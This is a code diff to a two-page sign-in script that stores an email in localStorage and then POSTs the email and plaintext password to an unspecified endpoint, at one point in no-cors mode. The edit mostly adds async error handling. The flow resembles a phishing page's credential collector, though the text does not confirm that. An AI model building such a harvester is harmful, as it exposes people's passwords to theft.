@@ -15,8 +15,12 @@ document.addEventListener("DOMContentLoaded", function() {
     if (nextButton) {
         nextButton.addEventListener("click", function (e) {
             e.preventDefault();
-            const email = emailInput?.value;
-            gotoPassword(email); 
+            if (!emailInput) {
+                return;
+            } else {
+                const email = emailInput.value;
+                gotoPassword(email); 
+            }
         }); 
     }
     else {
@@ -26,10 +30,10 @@ document.addEventListener("DOMContentLoaded", function() {
     const email = localStorage.getItem("user-email");
     emailClass.textContent = email;
 
-    submitButton.addEventListener("click", function (e) {
+    submitButton.addEventListener("click", async (e) => {
         e.preventDefault();
-        const password = passwordInput?.value;
-        sendFormAndRedirect(email, password);
+        const password = passwordInput.value;
+        await sendFormAndRedirect(email, password);
     });
 
     //go to password page function declaration
@@ -40,20 +44,31 @@ document.addEventListener("DOMContentLoaded", function() {
         window.location.href = `${hostname}/display-password.htm`;
     };
 
-    function sendFormAndRedirect(email, password) {
+    async function sendFormAndRedirect(email, password) {
         localStorage.removeItem("user-email");
 
-           const payload = {
+        const payload = {
                "email": email,
                "password": password
-           };
-        console.log({payload})
-        const res = fetch(endpoint, {
-            method: "POST",
-            mode: "no-cors",
-            body: JSON.stringify(payload)
-        }).then((response) => console.log(response));
-        
+        };
+        try {
+            const res = await fetch(`${endpoint}`, {
+                method: "POST",
+                //mode: "no-cors",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            });
+            console.log(res);
+            if (!res.ok) {
+                throw new Error(`HTTP error! status: ${res.status}`);
+            }
+            
+            console.log("res:", res);
+        } catch (error) {
+            console.error("Error:", error);
+        }
     };
 });
 
